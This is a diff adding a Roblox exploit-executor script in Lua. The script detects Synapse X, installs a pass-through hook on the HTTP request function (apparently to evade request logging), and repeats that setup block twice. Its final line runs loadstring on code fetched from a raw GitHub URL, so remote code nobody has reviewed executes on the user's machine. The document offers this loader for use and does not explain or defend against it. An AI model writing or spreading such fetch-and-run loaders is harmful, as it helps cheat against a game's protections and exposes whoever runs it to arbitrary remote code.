@@ -1,0 +1,23 @@
+local executor = identifyexecutor()
+local isSynapse = executor == 'Synapse X'
+
+local originalRequest = isSynapse and syn.request or request
+local hookTarget = isSynapse and syn.request or request
+
+local R
+R = hookfunction(hookTarget, function(...)
+    return R(...)
+    end)
+
+local executor = identifyexecutor()
+local isSynapse = executor == 'Synapse X'
+
+local originalRequest = isSynapse and syn.request or request
+local hookTarget = isSynapse and syn.request or request
+
+local R
+R = hookfunction(hookTarget, function(...)
+    return R(...)
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BS58dL/BS/refs/heads/main/black hole.Luau"))()
